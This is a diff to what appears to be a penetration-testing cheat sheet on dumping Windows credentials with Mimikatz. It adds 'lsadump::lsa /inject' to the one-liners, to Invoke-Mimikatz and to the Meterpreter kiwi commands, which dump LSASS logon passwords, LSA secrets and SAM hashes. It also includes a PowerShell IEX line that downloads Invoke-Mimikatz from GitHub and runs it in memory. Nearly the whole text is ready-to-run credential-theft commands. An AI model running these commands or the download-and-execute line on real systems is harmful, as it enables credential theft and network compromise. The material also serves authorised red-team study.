@@ -31,10 +31,12 @@ privilege::debug #This should give am error if you are Admin, butif it does, che
 token::elevate
 #Extract from lsass (memory)
 sekurlsa::logonpasswords
+#Extract from lsass (service)
+lsadump::lsa /inject
 #Extract from SAM
 lsadump::sam
 #One liner
-mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"
 ```
 
 **Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
@@ -44,7 +46,7 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'
 ```
 
 [**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
@@ -61,11 +63,12 @@ hashdump
 #Using kiwi module
 load kiwi
 creds_all
-kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
+kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"
 
 #Using Mimikatz module
 load mimikatz
 mimikatz_command -f "sekurlsa::logonpasswords"
+mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
 
